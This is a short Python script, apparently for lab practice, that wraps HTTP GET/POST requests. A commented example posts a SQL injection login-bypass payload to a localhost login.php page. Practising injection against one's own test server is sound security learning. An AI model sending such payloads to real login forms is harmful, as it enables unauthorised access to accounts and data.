import requests


def http_request_inject(method, url, data = None):
    
    if method == "get":
        response = requests.get(url)
    elif method == "post":
        response = requests.post(url, data=data)
    print(f"Response Code - {response.status_code}")
    print(response.text)
    return response

# if __name__ == "__main__":
#     http_request_inject("post", "http://localhost:8080/login.php", {"user": "' or 1=\"1\"; -- ", "password": "a"})